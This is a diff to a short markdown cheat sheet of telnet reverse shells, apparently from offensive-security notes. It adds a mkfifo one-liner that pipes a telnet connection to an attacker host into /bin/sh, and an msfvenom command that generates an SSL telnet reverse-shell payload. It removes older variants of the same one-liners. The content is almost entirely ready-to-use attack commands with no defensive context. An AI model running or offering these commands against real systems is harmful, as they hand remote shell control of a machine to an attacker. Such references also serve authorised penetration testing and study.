@@ -1,16 +1,21 @@
 # Telnet
 
+## 01 - One-liners
+
 ```
-$ rm -f /tmp/p; mknod /tmp/p p && telnet <IP> <PORT> 0/tmp/p
+$ TF=$(mktemp -u)
+mkfifo $TF && telnet <attacker_IP> <attacker_PORT> 0<$TF | /bin/sh 1>$TF; rm -f $TF
+```
 
-$ telnet <target_IP> 1234 | /bin/bash | telnet <attacker_IP> 1235
+## 02 - Generate via `msfvenom`
 
-$ nc -lvnp 1235
+```
+$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
 ```
 
 ---
 ## References
 
-- [Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
+- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
 
-- [One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
